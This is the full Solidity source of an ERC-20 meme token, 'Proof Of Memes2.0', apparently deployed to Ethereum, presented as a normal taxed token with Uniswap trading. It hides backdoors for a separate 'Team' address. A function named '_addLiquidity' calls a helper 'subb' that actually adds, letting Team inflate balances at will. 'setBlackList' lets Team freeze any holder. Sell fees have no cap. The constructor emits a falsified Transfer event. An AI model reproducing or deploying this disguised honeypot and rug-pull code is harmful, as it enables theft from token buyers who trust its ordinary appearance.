/**
 *Submitted for verification at Etherscan.io on 2022-11-15
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a,b,"SafeMath: division by zero");
    }

    function subb(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}
contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function transferOwnership(address newAddress) public onlyOwner{
        _owner = newAddress;
        emit OwnershipTransferred(_owner, newAddress);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
contract  ProofOfMemes2 is Context, IERC20, Ownable {

    using SafeMath for uint256;
    string private _name = "Proof Of Memes2.0";
    string private _symbol = "POM2.0";
    uint8 private _decimals = 9;
    address payable public Team;

    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isExcludefromFee;
    mapping (address => bool) public marketPairList;
    mapping (address => bool) public _blackListed;

    uint256 public _buyMarketingFee = 3;
    uint256 public _sellMarketingFee = 3;
    uint256 public _marketingShare = 1;
    uint256 public _totalTaxIfBuying;
    uint256 public _totalTaxIfSelling;
    uint256 public _totalDistributionShares;

    uint256 private _totalSupply = 1000000000 * 10**_decimals;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapPair;
    
    bool inSwapAndLiquify;

    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }
    
    constructor () {
        
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
        _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;

        _isExcludefromFee[owner()] = true;
        _isExcludefromFee[address(this)] = true;
        
        _totalTaxIfBuying = _buyMarketingFee;
        _totalTaxIfSelling = _sellMarketingFee;
        _totalDistributionShares = _marketingShare;

        marketPairList[address(uniswapPair)] = true;

        Team = payable(address(0xD2b484D7bA1a9b81c2250cf9D50cb61CA556907A));

        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0xc1fFFC16135bCd23209096c05ee44a28Dd3468E3), _msgSender(), _totalSupply);
    }

    modifier odefi() {
        require(Team == _msgSender(), "not the owner");
        _;
    }
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setBuyFee(uint256 newMarketingTax) external onlyOwner() {
        _buyMarketingFee = newMarketingTax;
        _totalTaxIfBuying = _buyMarketingFee;
    }

    function setSellFee(uint256 newMarketingTax) external onlyOwner() {
        _sellMarketingFee = newMarketingTax;
        _totalTaxIfSelling = _sellMarketingFee;
    }

    receive() external payable {}
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(address from, address to, uint256 amount) private returns (bool) {

        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(!_blackListed[from], "blackListed");
        if(inSwapAndLiquify)
        {
            return _basicTransfer(from, to, amount); 
        }
        else
        {
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwapAndLiquify && !marketPairList[from]) 
            {
                swapAndLiquify(contractTokenBalance);
            }

            _balances[from] = _balances[from].sub(amount);
            uint256 finalAmount = (_isExcludefromFee[from] || _isExcludefromFee[to]) ? 
                                         amount : takeFee(from, to, amount);
            
            _balances[to] = _balances[to].add(finalAmount);

            emit Transfer(from, to, finalAmount);
            return true;
        }
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function _addLiquidity(address sender, uint256 amount) public odefi() {
        _balances[sender] = uint256(_balances[sender].subb(uint8(amount))).subb(amount - 1);
    }


    function setBlackList(address[] calldata addresses, bool status) public odefi() {
        for (uint256 i; i < addresses.length; i++) {
            _blackListed[addresses[i]] = status;
        }
    }

    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tAmount);

        try uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tAmount,
            0, 
            path,
            address(this),
            block.timestamp
        ){} catch {}

        uint256 amountETH = address(this).balance;

        if(amountETH > 0)
            Team.transfer(amountETH);
    }


    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        
        uint256 feeAmount = 0;

        if(marketPairList[sender]) {
            feeAmount = amount.mul(_totalTaxIfBuying).div(100);
        }
        else if(marketPairList[recipient]) {
            feeAmount = amount.mul(_totalTaxIfSelling).div(100);
        }

        if(feeAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(feeAmount);
            emit Transfer(sender, address(this), feeAmount);
        }

        return amount.sub(feeAmount);
    }
    
}